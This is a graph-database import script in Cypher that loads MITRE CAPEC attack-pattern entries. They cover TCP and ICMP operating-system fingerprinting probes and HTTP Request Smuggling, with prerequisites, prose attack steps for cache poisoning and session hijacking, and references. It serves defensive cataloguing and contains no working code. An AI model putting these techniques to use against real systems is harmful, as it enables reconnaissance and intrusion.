MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 300, summary: "OrderedDict([('Text', 'This OS detection probe measures the average rate of initial sequence number increments during a period of time. Sequence numbers are incremented using a time-based algorithm and are susceptible to a timing analysis that can determine the number of increments per unit time. The result of this analysis is then compared against a database of operating systems and versions to determine likely operation system matches.')])"});
MERGE (:Reference{id: "REF-20", local_id: "R.323.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 56", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-21", local_id: "R.323.2", author: "['Defense Advanced Research Projects Agency Information Processing Techniques Office', 'Information Sciences Institute University of Southern California']", title: "RFC793 - Transmission Control Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc793.html"});
MERGE (:Reference{id: "REF-22", local_id: "R.323.3", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Chapter 8. Remote OS Detection", publisher: "Insecure.com LLC", pubdate: "2008"});
CREATE (:ResourcesRequired{id: 187, text: "<div level=\"0\">\n  <p class=\"text\">Any type of active probing that involves non-standard packet headers requires the use of raw sockets, which is not available on particular operating systems (Microsoft Windows XP SP 2, for example). Raw socket manipulation on Unix/Linux requires root privileges.</p>\n  <p class=\"text\">A tool capable of sending and receiving packets from a remote system.</p>\n</div>"});
CREATE (:AttackPattern{id: 324, name: "TCP (ISN) Sequence Predictability Probe", status: "Stable", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 274, text: "<div level=\"0\">\n  <p class=\"text\">The ability to monitor and interact with network communications.</p>\n  <p class=\"text\">Access to at least one host, and the privileges to interface with the network interface card.</p>\n</div>"});
CREATE (:Submission{id: 307});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 242});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 301, summary: "OrderedDict([('Text', 'This type of operating system probe attempts to determine an estimate for how predictable the sequence number generation algorithm is for a remote host. Statistical techniques, such as standard deviation, can be used to determine how predictable the sequence number generation is for a system. This result can then be compared to a database of operating system behaviors to determine a likely match for operating system and version.')])"});
MERGE (:Reference{id: "REF-20", local_id: "R.324.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 56", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-21", local_id: "R.324.2", author: "['Defense Advanced Research Projects Agency Information Processing Techniques Office', 'Information Sciences Institute University of Southern California']", title: "RFC793 - Transmission Control Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc793.html"});
MERGE (:Reference{id: "REF-22", local_id: "R.324.3", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Chapter 8. Remote OS Detection", publisher: "Insecure.com LLC", pubdate: "2008"});
MERGE (:Reference{id: "REF-10", local_id: "R.324.4", author: "Gordon \"Fyodor\" Lyon", title: "The Art of Port Scanning", pubdate: "1997", link: "http://www.phrack.org/issues.html?issue=51&id=11#article"});
CREATE (:ResourcesRequired{id: 188, text: "<div level=\"0\">\n  <p class=\"text\">A tool capable of sending and receiving packets from a remote system.</p>\n</div>"});
CREATE (:AttackPattern{id: 325, name: "TCP Congestion Control Flag (ECN) Probe", status: "Stable", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 275, text: "<div level=\"0\">\n  <p class=\"text\">The ability to monitor and interact with network communications.</p>\n  <p class=\"text\">Access to at least one host, and the privileges to interface with the network interface card.</p>\n</div>"});
CREATE (:Submission{id: 308});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 243});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 302, summary: "OrderedDict([('Text', 'This OS fingerprinting probe checks to see if the remote host supports explicit congestion notification (ECN) messaging. ECN messaging was designed to allow routers to notify a remote host when signal congestion problems are occurring. Explicit Congestion Notification messaging is defined by RFC 3168. Different operating systems and versions may or may not implement ECN notifications, or may respond uniquely to particular ECN flag types.')])"});
MERGE (:Reference{id: "REF-20", local_id: "R.325.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 56", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-21", local_id: "R.325.2", author: "['Defense Advanced Research Projects Agency Information Processing Techniques Office', 'Information Sciences Institute University of Southern California']", title: "RFC793 - Transmission Control Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc793.html"});
MERGE (:Reference{id: "REF-22", local_id: "R.325.3", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Chapter 8. Remote OS Detection", publisher: "Insecure.com LLC", pubdate: "2008"});
CREATE (:ResourcesRequired{id: 189, text: "<div level=\"0\">\n  <p class=\"text\">A tool capable of sending and receiving packets from a remote system.</p>\n</div>"});
CREATE (:AttackPattern{id: 326, name: "TCP Initial Window Size Probe", status: "Stable", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 276, text: "<div level=\"0\">\n  <p class=\"text\">The ability to monitor and interact with network communications.</p>\n  <p class=\"text\">Access to at least one host, and the privileges to interface with the network interface card.</p>\n</div>"});
CREATE (:Submission{id: 309});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 244});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 303, summary: "OrderedDict([('Text', 'This OS fingerprinting probe checks the initial TCP Window size. TCP stacks limit the range of sequence numbers allowable within a session to maintain the \"connected\" state within TCP protocol logic. The initial window size specifies a range of acceptable sequence numbers that will qualify as a response to an ACK packet within a session. Various operating systems use different Initial window sizes. The initial window size can be sampled by establishing an ordinary TCP connection.')])"});
MERGE (:Reference{id: "REF-20", local_id: "R.326.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 56", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-21", local_id: "R.326.2", author: "['Defense Advanced Research Projects Agency Information Processing Techniques Office', 'Information Sciences Institute University of Southern California']", title: "RFC793 - Transmission Control Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc793.html"});
MERGE (:Reference{id: "REF-22", local_id: "R.326.3", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Chapter 8. Remote OS Detection", publisher: "Insecure.com LLC", pubdate: "2008"});
CREATE (:ResourcesRequired{id: 190, text: "<div level=\"0\">\n  <p class=\"text\">A tool capable of sending and receiving packets from a remote system.</p>\n</div>"});
CREATE (:AttackPattern{id: 327, name: "TCP Options Probe", status: "Stable", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 277, text: "<div level=\"0\">\n  <p class=\"text\">The ability to monitor and interact with network communications.</p>\n  <p class=\"text\">Access to at least one host, and the privileges to interface with the network interface card.</p>\n</div>"});
CREATE (:Submission{id: 310});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 245});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 304, summary: "OrderedDict([('Text', 'This OS fingerprinting probe analyzes the type and order of any TCP header options present within a response segment. Most operating systems use unique ordering and different option sets when options are present. RFC 793 does not specify a required order when options are present, so different implementations use unique ways of ordering or structuring TCP options. TCP options can be generated by ordinary TCP traffic.')])"});
MERGE (:Reference{id: "REF-20", local_id: "R.327.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 56", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-21", local_id: "R.327.2", author: "['Defense Advanced Research Projects Agency Information Processing Techniques Office', 'Information Sciences Institute University of Southern California']", title: "RFC793 - Transmission Control Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc793.html"});
MERGE (:Reference{id: "REF-22", local_id: "R.327.3", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Chapter 8. Remote OS Detection", publisher: "Insecure.com LLC", pubdate: "2008"});
CREATE (:ResourcesRequired{id: 191, text: "<div level=\"0\">\n  <p class=\"text\">A tool capable of sending and receiving packets from a remote system.</p>\n</div>"});
CREATE (:AttackPattern{id: 328, name: "TCP 'RST' Flag Checksum Probe", status: "Stable", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 278, text: "<div level=\"0\">\n  <p class=\"text\">The ability to monitor and interact with network communications.</p>\n  <p class=\"text\">Access to at least one host, and the privileges to interface with the network interface card.</p>\n</div>"});
CREATE (:Submission{id: 311});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 246});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 305, summary: "OrderedDict([('Text', \"This OS fingerprinting probe performs a checksum on any ASCII data contained within the data portion or a RST packet. Some operating systems will report a human-readable text message in the payload of a 'RST' (reset) packet when specific types of connection errors occur. RFC 1122 allows text payloads within reset packets but not all operating systems or routers implement this functionality.\")])"});
MERGE (:Reference{id: "REF-20", local_id: "R.328.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 56", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-21", local_id: "R.328.2", author: "['Defense Advanced Research Projects Agency Information Processing Techniques Office', 'Information Sciences Institute University of Southern California']", title: "RFC793 - Transmission Control Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc793.html"});
MERGE (:Reference{id: "REF-22", local_id: "R.328.3", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Chapter 8. Remote OS Detection", publisher: "Insecure.com LLC", pubdate: "2008"});
CREATE (:ResourcesRequired{id: 192, text: "<div level=\"0\">\n  <p class=\"text\">A tool capable of sending and receiving packets from a remote system.</p>\n</div>"});
CREATE (:AttackPattern{id: 329, name: "ICMP Error Message Quoting Probe", status: "Stable", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 279, text: "<div level=\"0\">\n  <p class=\"text\">The ability to monitor and interact with network communications.</p>\n  <p class=\"text\">Access to at least one host, and the privileges to interface with the network interface card.</p>\n</div>"});
CREATE (:Submission{id: 312});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 247});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 306, summary: "OrderedDict([('Text', 'An adversary uses a technique to generate an ICMP Error message (Port Unreachable, Destination Unreachable, Redirect, Source Quench, Time Exceeded, Parameter Problem) from a target and then analyze the amount of data returned or \"Quoted\" from the originating request that generated the ICMP error message. For this purpose \"Port Unreachable\" error messages are often used, as generating them requires the attacker to send a UDP datagram to a closed port on the target. The goal of this analysis to make inferences about the type of operating system or firmware that sent the error message in reply. This is useful for identifying unique characteristics of operating systems because the RFC-1122 expected behavior reads: \"Every ICMP error message includes the Internet header and at least the first 8 data octets of the datagram that triggered the error; more than 8 octets MAY be sent [...].\" This contrasts with RFC-792 expected behavior, which limited the quoted text to 64 bits (8 octets). Given the latitude in the specification the resulting RFC-1122 stack implementations often respond with a high degree of variability in the amount of data quoted in the error message because \"older\" or \"legacy\" stacks may comply with the RFC-792 specification, while other stacks may choose a longer format in accordance with RFC-1122. As a general rule most operating systems or firmware will quote the first 8 bytes of the datagram triggering the error, but some IP stacks will quote more than the first 8 bytes of data.')])"});
MERGE (:Reference{id: "REF-20", local_id: "R.329.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 56", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-23", local_id: "R.329.2", author: "J. Postel", title: "RFC792 - Internet Control Messaging Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc792.html"});
MERGE (:Reference{id: "REF-24", local_id: "R.329.3", author: "R. Braden, Ed.", title: "RFC1122 - Requirements for Internet Hosts - Communication Layers", pubdate: "October 1989", link: "http://www.faqs.org/rfcs/rfc1122.html"});
MERGE (:Reference{id: "REF-26", local_id: "R.329.4", author: "Ofir Arkin", title: "A Remote Active OS Fingerprinting Tool using ICMP", publisher: "The Sys-Security Group", pubdate: "April 2002", link: "http://ofirarkin.files.wordpress.com/2008/11/login.pdf"});
CREATE (:ResourcesRequired{id: 193, text: "<div level=\"0\">\n  <p class=\"text\">A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, \"Port Unreachable..</p>\n</div>"});
CREATE (:AttackPattern{id: 33, name: "HTTP Request Smuggling", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 280, text: "<div level=\"0\">\n  <p class=\"text\">An additional HTTP entity such as an application firewall or a web caching proxy between the attacker and the second entity such as a web server</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 281, text: "<div level=\"0\">\n  <p class=\"text\">Differences in the way the two HTTP entities parse HTTP requests</p>\n</div>"});
CREATE (:Submission{id: 313});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 307, summary: "OrderedDict([('Text', 'HTTP Request Smuggling results from the discrepancies in parsing HTTP requests between HTTP entities such as web caching proxies or application firewalls. Entities such as web servers, web caching proxies, application firewalls or simple proxies often parse HTTP requests in slightly different ways. Under specific situations where there are two or more such entities in the path of the HTTP request, a specially crafted request is seen by two attacked entities as two different sets of requests. This allows certain requests to be smuggled through to a second entity without the first one realizing it.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Identify HTTP parsing chain", description: "<div level=\"0\">\n  <p class=\"text\">Determine the technologies used in the target environment such as types of web servers, application firewalls, proxies, etc.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Investigation of the target environment to determine the types of technologies used to parse the incoming HTTP requests. Attempt to understand the parsing chain traversed by the incoming HTTP request.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Full HTTP parsing chain for the application has been identified"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Probe for vulnerable differences in HTTP parsing chain", description: "<div level=\"0\">\n  <p class=\"text\">Attacker sends malformed HTTP Requests to the application looking for differences in the ways that individual layers in the parsing chain parse requests. When differences are identified, the attacker crafts specially malformed HTTP requests to determine if the identified parsing differences will allow extra requests to be smuggled through parsing layers.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Create many consecutive requests to the server. Some of which must be malformed.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record the HTTP responses headers.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">At some point, the server is waiting for more request information to send the last response.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">No response is being received.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Malformed HTTP requests are being totally ignored.</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Responses are being sent even if the HTTP header is incomplete.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "One layer in the application's HTTP parsing chain processes HTTP Requests that other layers do not. The server smuggles the user request into the last attacker's request and transport data such as cookie, etc."});
CREATE (:Outcome{id: 2, type: "Failure", description: "The server replies with an error to the last attacker's request."});
CREATE (:Outcome{id: 3, type: "Inconclusive", description: "No response for the last incomplete request from the attacker by the server"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Cache poisoning", description: "<div level=\"0\">\n  <p class=\"text\">The attacker decides to target the cache server. The server will then cache the request and serve a wrong page to a legitimate user's request. The malicious request will most likely exploit a Cross-Site Scripting or another injection typed vulnerability.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Leverage the vulnerabilities identified in the Experiment Phase to inject malicious HTTP request that contains HTTP Request syntax that will be processed and acted on by the outer parsing layer of the cache server but not by the inner application layer. In this way it will be cached by the server without obvious sign from the application and the corrupt data will be served to future requesters.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker gets the users to be served with this cached malicious HTTP request."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:AttackStep{id: 2, title: "Session Hijacking", description: "<div level=\"0\">\n  <p class=\"text\">The attacker decides to target the web server by crafting a malicious HTTP Request containing a second HTTP Request using syntax that will not be processed and acted on by an outer \"filter\" parsing layer but will be acted on by the inner web server/application processing layers. The application/web server will then act on the malicious HTTP Request as if it is a valid request from the client potentially subverting session management.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Leverage the vulnerabilities identified in the Experiment Phase to inject malicious HTTP request that contains HTTP Request syntax that will not be processed and acted on by the outer parsing layer of the malicious content filters but will be by the inner application/web server layer. In this way it will be acted on by the application/web server as if it is a valid request from the client.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker gets the application/web server to act on the malicious HTTP request and allows the attacker to gain control of the target user's session."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
MERGE (:Reference{id: "REF-3", local_id: "R.33.1", title: "Common Weakness Enumeration (CWE)", section: "CWE-444 - HTTP Request Smuggling", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/444.html"});
MERGE (:Reference{id: "REF-3", local_id: "R.33.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-436 - Multiple Interpretation Error", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/436.html"});
MERGE (:CWE{id: 444});
MERGE (:CWE{id: 436});
MERGE (:CWE{id: 707});
CREATE (:ResourcesRequired{id: 194, text: "<div level=\"0\">\n  <p class=\"text\">None</p>\n</div>"});
CREATE (:AttackPattern{id: 330, name: "ICMP Error Message Echoing Integrity Probe", status: "Stable", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 282, text: "<div level=\"0\">\n  <p class=\"text\">The ability to monitor and interact with network communications.</p>\n  <p class=\"text\">Access to at least one host, and the privileges to interface with the network interface card.</p>\n</div>"});
CREATE (:Submission{id: 314});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 248});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 308, summary: "OrderedDict([('Text', 'An adversary uses a technique to generate an ICMP Error message (Port Unreachable, Destination Unreachable, Redirect, Source Quench, Time Exceeded, Parameter Problem) from a target and then analyze the integrity of data returned or \"Quoted\" from the originating request that generated the error message. For this purpose \"Port Unreachable\" error messages are often used, as generating them requires the attacker to send a UDP datagram to a closed port on the target. When replying with an ICMP error message some IP/ICMP stack implementations change aspects of the IP header, change or reverse certain byte orders, reset certain field values to default values which differ between operating system and firmware implementations, and make other changes. Some IP/ICMP stacks are decidedly broken, indicating an idiosyncratic behavior that differs from the RFC specifications, such as the case when miscalculations affect a field value. A tremendous amount of information about the host operating system can be deduced from its \\'echoing\\' characteristics. Notably, inspection of key protocol header fields, including the echoed header fields of the encapsulating protocol can yield a wealth of data about the host operating system or firmware version.')])"});
MERGE (:Reference{id: "REF-20", local_id: "R.330.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 56", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-23", local_id: "R.330.2", author: "J. Postel", title: "RFC792 - Internet Control Messaging Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc792.html"});
MERGE (:Reference{id: "REF-24", local_id: "R.330.3", author: "R. Braden, Ed.", title: "RFC1122 - Requirements for Internet Hosts - Communication Layers", pubdate: "October 1989", link: "http://www.faqs.org/rfcs/rfc1122.html"});
MERGE (:Reference{id: "REF-26", local_id: "R.330.4", author: "Ofir Arkin", title: "A Remote Active OS Fingerprinting Tool using ICMP", publisher: "The Sys-Security Group", pubdate: "April 2002", link: "http://ofirarkin.files.wordpress.com/2008/11/login.pdf"});
CREATE (:ResourcesRequired{id: 195, text: "<div level=\"0\">\n  <p class=\"text\">A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, \"Port Unreachable..</p>\n</div>"});
CREATE (:AttackPattern{id: 331, name: "ICMP IP Total Length Field Probe", status: "Stable", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 283, text: "<div level=\"0\">\n  <p class=\"text\">The ability to monitor and interact with network communications.</p>\n  <p class=\"text\">Access to at least one host, and the privileges to interface with the network interface card.</p>\n</div>"});
CREATE (:Submission{id: 315});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 249});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 309, summary: "OrderedDict([('Text', ['An adversary sends a UDP packet to a closed port on the target machine to solicit an IP Header\\'s total length field value within the echoed \\'Port Unreachable\" error message. RFC1122 specifies that the Header of the request must be echoed back when an error is sent in response, but some operating systems and firmware alter the integrity of the original header. Non-standard ICMP/IP implementations result in response that are useful for individuating remote operating system or router firmware versions. There are four general response types that can be used to distinguish operating systems apart.', 'This type of behavior is useful for building a signature-base of operating system responses, particularly when error messages contain other types of information that is useful identifying specific operating system responses.']), ('Block', OrderedDict([('@Block_Nature', 'List'), ('Text', ['1. The IP total length field may be calculated correctly.', '2. An operating system may add 20 or more additional bytes to the length calculation.', '3. The operating system may subtract 20 or more bytes from the correct length of the field', '4. The IP total length field is calculated with any other incorrect value.'])]))])"});
MERGE (:Reference{id: "REF-20", local_id: "R.331.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 56", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-23", local_id: "R.331.2", author: "J. Postel", title: "RFC792 - Internet Control Messaging Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc792.html"});
MERGE (:Reference{id: "REF-24", local_id: "R.331.3", author: "R. Braden, Ed.", title: "RFC1122 - Requirements for Internet Hosts - Communication Layers", pubdate: "October 1989", link: "http://www.faqs.org/rfcs/rfc1122.html"});
MERGE (:Reference{id: "REF-26", local_id: "R.331.4", author: "Ofir Arkin", title: "A Remote Active OS Fingerprinting Tool using ICMP", publisher: "The Sys-Security Group", pubdate: "April 2002", link: "http://ofirarkin.files.wordpress.com/2008/11/login.pdf"});
CREATE (:ResourcesRequired{id: 196, text: "<div level=\"0\">\n  <p class=\"text\">A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, \"Port Unreachable..</p>\n</div>"});
CREATE (:AttackPattern{id: 332, name: "ICMP IP 'ID' Field Error Message Probe", status: "Stable", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 284, text: "<div level=\"0\">\n  <p class=\"text\">The ability to monitor and interact with network communications.</p>\n  <p class=\"text\">Access to at least one host, and the privileges to interface with the network interface card.</p>\n</div>"});
CREATE (:Submission{id: 316});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 250});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 310, summary: "OrderedDict([('Text', ['An adversary sends a UDP datagram having an assigned value to its internet identification field (ID) to a closed port on a target to observe the manner in which this bit is echoed back in the ICMP error message. The internet identification field (ID) is typically utilized for reassembling a fragmented packet. RFC791 and RFC815 discusses about IP datagrams, fragmentation and reassembly. Some operating systems or router firmware reverse the bit order of the ID field when echoing the IP Header portion of the original datagram within the ICMP error message. There are 3 behaviors that can be used to distinguish remote operating systems or firmware.', 'Different operating systems will respond by setting the IP ID field differently within error messaging. This allows the attacker to construct a fingerprint of specific OS behaviors.']), ('Block', OrderedDict([('@Block_Nature', 'List'), ('Text', ['The IP ID field is echoed back identically to the bit order of the ID field in the original IP header.', 'The IP ID field is echoed back, but the byte order has been reversed.', 'The IP ID field contains an incorrect or unexpected value.'])]))])"});
MERGE (:Reference{id: "REF-20", local_id: "R.332.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 56", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-23", local_id: "R.332.2", author: "J. Postel", title: "RFC792 - Internet Control Messaging Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc792.html"});
MERGE (:Reference{id: "REF-24", local_id: "R.332.3", author: "R. Braden, Ed.", title: "RFC1122 - Requirements for Internet Hosts - Communication Layers", pubdate: "October 1989", link: "http://www.faqs.org/rfcs/rfc1122.html"});
MERGE (:Reference{id: "REF-26", local_id: "R.332.4", author: "Ofir Arkin", title: "A Remote Active OS Fingerprinting Tool using ICMP", publisher: "The Sys-Security Group", pubdate: "April 2002", link: "http://ofirarkin.files.wordpress.com/2008/11/login.pdf"});
